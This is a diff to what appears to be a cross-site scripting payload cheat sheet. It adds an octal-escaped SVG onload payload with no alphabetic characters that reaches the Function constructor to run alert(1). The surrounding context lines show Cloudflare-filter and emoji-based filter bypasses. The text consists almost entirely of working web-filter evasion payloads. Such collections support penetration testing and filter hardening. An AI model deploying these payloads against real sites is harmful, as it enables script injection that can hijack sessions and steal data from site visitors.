@@ -27,6 +27,11 @@ Skip XSS filters with CloudFlare{};
 <select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
 
 
+payload without Alphabetic Characters
+<svg/onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()">
+
+
+
 Bypass an XSS filter with emoji 
 "[emoji]<<sVg/onload[emoji]=/svg/onload=svg/onmouseOver=confirm`1`><!--[emoji]//="
 
